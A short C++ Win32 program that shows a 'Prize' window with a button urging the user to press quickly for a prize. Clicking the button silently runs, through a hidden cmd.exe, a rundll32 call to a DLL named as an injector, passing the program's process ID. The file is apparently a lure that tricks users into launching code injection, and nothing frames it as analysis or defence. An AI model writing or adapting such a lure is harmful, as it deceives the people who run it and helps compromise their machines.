#include <windows.h>
#include <shellapi.h>
#include <string>
#include <cstdio>

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE:
        CreateWindowA("BUTTON", "QUICK, press for PRIZE!",
                      WS_VISIBLE | WS_CHILD,
                      75, 60, 250, 50,
                      hwnd, (HMENU)1, GetModuleHandle(NULL), NULL);
        return 0;

    case WM_COMMAND:
        if (LOWORD(wParam) == 1) {
            DWORD pid = GetCurrentProcessId();
            char command[512];
            sprintf(command, "rundll32.exe DllInjectorAsDll.dll,HelperFunc %lu", pid);
            ShellExecuteA(NULL, "open", "cmd.exe", (std::string("/c ") + command).c_str(), NULL, SW_HIDE);
        }
        break;

    case WM_ERASEBKGND: {
        RECT rect;
        GetClientRect(hwnd, &rect);
        HDC hdc = (HDC)wParam;
        HBRUSH hBrush = CreateSolidBrush(RGB(255, 255, 200));
        FillRect(hdc, &rect, hBrush);
        DeleteObject(hBrush);
        return 1;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "Prize";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(
        0, "Prize", "Prize",
        WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
        100, 100, 400, 200,
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, nCmdShow);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
